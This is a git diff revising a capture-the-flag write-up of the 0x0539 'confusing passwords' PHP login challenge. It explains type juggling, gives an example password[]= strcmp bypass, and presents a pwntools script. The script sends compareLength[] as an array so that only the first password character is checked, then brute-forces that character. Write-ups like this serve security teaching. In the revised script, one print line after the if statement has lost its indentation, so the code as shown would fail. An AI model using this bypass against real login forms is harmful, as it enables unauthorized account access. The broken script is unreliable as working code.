@@ -4,6 +4,7 @@ description: "This login system will give you the flag... as long as you can pro
 author: "0x0539"
 date: "2023-06-16"
 published: true
+tags: ["capture the flag", "0x0539", "web"]
 ---
 
 # confusing passwords
@@ -17,7 +18,7 @@ Prove [you're] an admin to access the flag.
 
 ## overview
 
-the challenge landing page presents us with the login form and the page's source code. its a php-based login form, and the source immediately confirms a handful of credentials:
+The challenge landing page presents us with the login form and the page's source code. It's PHP-based, and the source code here contains hardcoded credentials (in the form of our target username, `admin`):
 
 ```php
 <?php
@@ -51,7 +52,7 @@ the challenge landing page presents us with the login form and the page's source
   $loginAttempted = false;
   $loginSuccess   = false;
 
-  $correctUsername  = "admin"; // ok
+  $correctUsername  = "admin";
   $correctPassword  = file_get_contents("/adminpwd.txt", FILE_USE_INCLUDE_PATH);
 
   // :D
@@ -69,137 +70,122 @@ the challenge landing page presents us with the login form and the page's source
   }
 ?>
 
-// [ and then the page's html & css. ]
+<!-- [ and then the page's html & css. ] -->
 ```
 
 ## initial enumeration
 
-upon initial inspection, the above source code indicates that any username entered into the site is checked against the string `admin`. furthermore, the `checkCredentials` function ensures
-- all parameters are included in request, and
-- the `username` and `compareLength` parameters contain a value.
+Upon initial inspection, it seems the `checkCredentials` function ensures the following:
+- all necessary parameters must be included in a POST request,
+- the `username` and `compareLength` parameters must contain a value.
 
-we can run some requests through burpsuite to modify POST data - this test form gives us a general idea of the intended form functionality - we also see that the default value for `compareLength` is `32`.
+We can run some requests through burpsuite to make some modifications to the request's POST data - we see that the default value for `compareLength` is `32`.
 
 ![burp_post_test](/img/confusing_passwords_img/burp_post_test.png)
 
-the final line `return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);` is especially interesting here. it looks like the program compares `$password` against `$correctPassword` for each character for a maximum of `intval($checkCompareLen)` characters and returning true if all compared characters match -  if we set `checkCompareLen` to `0` in a POST request, `intval($checkCompareLen)` would be `0`, and we may be able to login without a password.
+Given this, the final line of the login form's code:
+```php
+// ...
+return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
+```
+...seems especially interesting.
 
-upon sending a request with `compareLength=0`, we note the lack of a `login failed` warning - feeback that the page isnt processing our request in the same manner as before:
+It appears that the program compares each character in our POSTed password - stored in the variable`$password` - against `$correctPassword`, but it uses `compareLength` (which we can modify) to determine how many characters it should compare.
+If correct, we can set `checkCompareLen` to `0` via our POST request, which would set `intval($checkCompareLen)` to `0`. This would mean the form would compare 0 characters from the POSTed password to the actual password, possibly allowing us to bypass the password requirement altogether.
 
-![burp_post_test](/img/confusing_passwords_img/burp_post_test_2.png)
-
-looking at the markup for rendering the `Login failed` warning, we can see that it is displayed if `$loginSuccess != true` AND `$loginAttempted == true`.
-
-i _assume_ that this occurs as `!empty($_POST["compareLength"]))` returns `false` when its value is `0`, and so `$loginAttempted` is not updated to `true` and the banner is not rendered:
+However, this won't work because the script ensures the value of `compareLength` will cover the minimum number of characters in `$correctPassword`:
 
 ```php
-<?php
 // ...
-function checkCredentials($user, $password, $correctUser, $correctPassword, $checkCompareLen)
-  {
-    if($user != $correctUser)
+// Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that
+// it's fully compared.
+if($checkCompareLen < strlen($correctPassword))
       return false;
-    if($checkCompareLen < strlen($correctPassword))
-      return false;
-    if($checkCompareLen < 0)
-      return false;
-    return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
-  }
-// ...
-?>
-
-  // the section in markup where the check to determine if a 'login failed' warning needs to be rendered:
-
-<?php if($loginSuccess) { ?>
-    <div class="alert alert-success" role="alert">
-        Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>
-    </div>
-    <?php } elseif(!$loginSuccess && $loginAttempted) { ?>     // <-- note the `&&` operator
-        <div class="alert alert-danger" role="alert">
-            Login failed.
-        </div>
-<?php } ?>
 ```
 
-ultimately, this means the page doesnt run checks on our `compareLength` if it is set to `0` in this way.
+So this idea won't work.
 
 ## vulnerabilities
 
-so to reiterate purely on speculation using the source code:
+So to recap, we should be able to make the following assumptions :
 
-1. the `username` parameter must be the same value as `$correctUser`, and
-2. the posted `compareLength` parameter has to be both:
-    1. a positive integer greater than `0`,
-    2. a value greater than or equal to the length of `$correctPassword`.
+- The value of `username` from the POST request must be the same as that of `$correctUser`,
+- The value of the `compareLength` parameter must be:
+    1. Greater than `0`,
+    2. Greater than (or equal to) the number of characters in `$correctPassword`.
 
-### `username` parameter
+### `username` parameter?
 
-we already know from source code that the correct username is `admin`; `username` ultimately doesn't appear to play any further role in authentication, so we can ignore this for now.
+We already know from source code that the correct username is `admin`, and `username` ultimately isn't really involved in further authentication functionality, so this can be ignored for now.
 
-instead, we may be able to modify our POST request to pass an unexpected value to the `password` or `compareLength` checks, which may invoke some unexpected behaviour.
+### `password` parameter?
 
-we can do this using a vulnerability called `type juggling`, which is a result of a programming language converting different object types to a "common value" when it is asked to run comparisons on them. in PHP, these vulnerabilities are commonly the result of 'loose' comparison operators (e.g., `==`, `!=`), which will compare only the _value_ stored in an object when invoked.
+Instead, we may be able to modify our POST request to pass an unexpected value to the `password` or `compareLength` checks, which may invoke some unexpected behaviour.
 
-conversely, 'strict' operators (`===`, `!==`, and so on) will also compare the _type_ of each object alongside its value.
+We can do this via a class of vulnerability called `type juggling`, which (in this case) is a result of PHPs interpreter converting different types (integers, strings, arrays, and so on) to a "common value"
+when it needs to perform operations on them. In PHP, these vulnerabilities are commonly the result of 'loose' comparison operators (e.g., `==`, `!=`), which will compare only the _value_ stored in an object when invoked.
 
-### `password` parameter
+Conversely, 'strict' operators (`===`, `!==`, and so on) will compare both the stored value alongside the object's _type_.
 
-to explain this in a little more detail - if the page had used a regular `strcmp()` function (as opposed to `str<n>cmp()`) with a loose comparison operator, we could modify the password parameter of a POST request as follows:
-
+A common PHP vulnerability involves a login form script that uses the `strcmp()` function paired with a loose comparison operator, which can be exploited by changing the type of one of these variables:
 ```php
-// a hypothetical webpage might try to validate a password with a `strcmp()` function, and
-// then comparing its returned value to `0`:
+// a hypothetical webpage might try to validate a password with a `strcmp()` function like so:
 return (strcmp($password, $correctPassword) == 0)
 
-// `strcmp()` wants to operate on two string objects, as it will compare each character in each string, incrementing
-// the returning value by 1 for each differing character:
+// `strcmp()` wants to operate on two strings, and will compare each string character-by-character:
 return (strcmp("password123", "password123") == 0) // returns `true` as there are 0 different characters.
 
 // in the above example, if we were to make a post request with the following parameters:
 username=admin&password[]=
 
 // it would be evaulated as:
-return (strcmp(Array(),"real_password123") == 0) // returns `true`; `Array()` == `NULL` == `0`.
-// an unexpected array object is determined by `strcmp()` to contain the value `NULL`;
-// PHP considers `NULL` to be "loosely" equal to `0`, and so the login form will return `true` under this condition.
+return (strcmp(Array(),"real_password123") == 0) // this returns `true`: `Array()` == `NULL` == `0`.
+// an unexpected array object is determined by `strcmp()` to contain `NULL`;
+// PHP considers `NULL` to be 'loosely' equal to `0`, and so the login form will return `true` for this operation.
 ```
 
-we are not dealing with the exact functionality as indicated above due to the strict comparison operation, but serves as a simple example - there are a number of type conversions that take place before our input is compared to `0` at the end of the `checkCredentials` function, which leaves significant room for error.
-
-we _also_ get rendered feedback regarding the evaluation of our modified `password` parameter, so we can programmatically use page data to check when the page has run a `strncmp` comparison on our input:
-
-![burp_post_test](/img/confusing_passwords_img/burp_post_test_3.png)
-
-as the password value isn't used in loose operations, however, it isnt feasible to directly trick the form with type juggling.
+However, we are not dealing with the exact functionality due to a strict comparison operation, but serves as a simple example.
 
 ### `compareLength` parameter
 
-regarding `compareLength`; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is `> 0`, passes all 'pre-strncmp()' statements, and also results in a low number when the page uses it to index the number of characters to check; even if this were a value like `3` or `4`, the form would be dramatically easier to bruteforce.
+Regarding `compareLength`; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is greater than `0`,
+passes all 'pre-strncmp()' statements, and also results in a low number when the page uses it to index the number of characters to check.
 
 ### exploit
 
-thankfully, `intval()` is used to convert the data in `compareLength` to an integer; a practice that the [php documenataion **strongly** advises against when dealing with objects](https://www.php.net/manual/en/function.intval.php):
+The login function uses `intval()` to convert the data in `compareLength` to an integer; a practice that the [PHP documentaion **strongly** advises against when dealing with objects](https://www.php.net/manual/en/function.intval.php):
 
 >Returns the int value of value, using the specified base for the conversion (the default is base 10). **intval() should not be used on objects, as doing so will emit an E_WARNING level error and return 1.**
 
-another notable quirk about PHP & arrays (as it related to the page's functionality): array objects are always considered greater than any non-array object (without considering their actual values), so a request with an empty array will pass both the pre-check tests.
+Another notable quirk about PHP & arrays (as it related to the page's functionality): Array objects are always considered greater than any non-array object (regardless of their actual values) - so a request with an empty array will pass both the tests we require.
 
-so, if we pass an Array to the `compareLength` parameter:
+So, by assigning an Array to the `compareLength` parameter:
 
-* it will be a larger number than the length of `correctPassword` simply on principle, but
-* `intval()` evaluates it as `1`,
+- it will be a larger number than the length of `correctPassword` via type conversion principles,
+- `intval()` will still evaluate it as `1`.
 
-so `strncmp()` will only compare the first character in `$correctPassword` and our `password` parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a *maximum* of ~52 characters (the first character is likely [`a-Z`]).
+This ultimately means `strncmp()` will only be asked to compare the first character in `$correctPassword` and our `password` parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a *maximum* of ~52 requests (the first character is likely [`a-Z`]).
 
-we can check that our interpretation of the request is correct by submitting a post request with the `password` and `compareLength` params as arrays; if the page renders the `strncmp` warning, we know that it tried to parse the arrays as strings:
+We can check that our interpretation of the request is correct by submitting a post request with the `password` and `compareLength` params as arrays:
 
 ![burp_post_test](/img/confusing_passwords_img/burp_post_test_4.png)
 
-with this theory confirmed, a quick python script using header info from burpsuite to feed into `pwntools`:
+The page throws a `strncmp` warning, so we know that it tried to parse the arrays as strings.
 
-1. we make a post request with a malformed `compareLength` parameter,
-2. the response is checked against a success condition; failed attempts are ignored,
-3. upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain '`Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>`', though this could just as easily be replace with the opposite operation; something like `if not b'Login failed' in response`):
+With this type juggling exploit confirmed, we can throw together a quick python script with `pwntools`:
+
+- we make a post request with a malformed `compareLength` parameter,
+- the response is checked against a success condition; failed attempts are ignored,
+- upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain
+
+
+```php
+// ...
+Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>`
+```
+>This could just as easily be replace with the opposite operation; something like `if not b'Login failed' in response`).
+
+In any case, this was the final exploit script:
 
 ```python
 from pwn import *
@@ -220,16 +206,14 @@ for char in charset:
             'username=admin&password={}&compareLength[]='.format(char))
 
     response = r.recvall()
-    if b'the secret flag:' in response: # alternatively, `if not b'Login failed' in response`...
-        print(f'\n####### \n\'secret flag\' found in response. trimmed output:')
+    if b'the secret flag:' in response:
+    print(f'\n####### \n\'secret flag\' found in response. trimmed output:')
         print(((response.rsplit(b' Welcome admin.',2)[1]).rsplit(b'</div>\n')[0]).strip())
         print('#######')
         break
 ```
 
-## flag
-
-running the script, we get a successful login on a POST with `&password=f`:
+Running the script, we are able to successfully login with a POST request using `&password=f`:
 
 ```lua
 ┌──(root㉿RUBY)-[/mnt/…/ctf/sites/0x0539/confusing-passwords]
@@ -245,6 +229,6 @@ trying f...
 #######
 'secret flag' found in response. appending trimmed output:
 
-b"Since you've authenticated as an admin, here's the secret flag: FLAG{*redacted*}"
+b"Since you've authenticated as an admin, here's the secret flag: FLAG{[redacted]}"
 #######
 ```
